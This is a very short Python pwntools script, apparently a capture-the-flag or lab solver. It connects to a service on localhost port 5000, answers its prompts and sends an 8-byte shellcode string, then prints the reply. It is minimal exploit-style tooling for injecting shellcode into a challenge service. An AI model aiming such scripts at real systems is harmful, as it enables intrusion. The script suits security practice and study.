from pwn import *

kBuiltinShellcode = b"\x00\x00\x11\x42\x00\x00\x11\x74"

r = remote("localhost", 5000)
r.recvuntil(b"(0 to use the builtin): ")
r.sendline(f"{len(kBuiltinShellcode)}".encode())
r.recvuntil(b"bytes of shellcode: ")
r.send(kBuiltinShellcode)
print(r.clean(timeout=0.5).decode())